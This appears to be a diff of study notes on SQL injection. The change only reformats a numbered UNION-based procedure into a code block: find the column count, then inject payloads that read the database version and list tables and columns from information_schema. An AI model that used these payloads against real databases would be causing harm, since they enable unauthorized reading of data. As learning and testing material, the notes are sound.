@@ -12,12 +12,14 @@ WHERE user.name = 'jeffrey';
 ```
 
 
-1. FIND NUMBER OF COLUMNS  
-	"order by" trick - test if you can order by a column number
+```
+1. FIND NUMBER OF COLUMNS 
+  "order by" trick - test if you can order by a column number
 
-2. NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)  
-	' union select 1,2,3,version() -- -
+2. NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)
+  ' union select 1,2,3,version() -- -
 
-3. NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO  
-	' union select 1,2,3,table_name from information_schema.tables where table_schema="x8250" -- -  
+3. NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO
+  ' union select 1,2,3,table_name from information_schema.tables where table_schema="x8250" -- -  
   ' union select 1,2,3,column_name from information_schema.columns where table...
+```
